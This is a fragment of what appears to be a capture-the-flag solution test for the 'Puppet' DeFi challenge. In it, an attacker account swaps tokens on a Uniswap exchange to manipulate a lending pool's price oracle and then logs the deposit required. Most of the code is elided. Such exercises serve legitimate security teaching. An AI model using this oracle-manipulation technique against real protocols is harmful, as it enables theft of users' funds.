...
describe('[Challenge] Puppet', function () {
    ...
    it('Exploit', async function () {
        ...
        // await this.token.connect(attacker).transfer(this.uniswapExchange.address,1000);
        const now = Math.floor(new Date().getTime()/ 1000);

        await this.uniswapExchange.connect(attacker).tokenToEthSwapOutput(ethers.utils.parseEther('9.9'),
        ...
        console.log(depositRequired.toString());
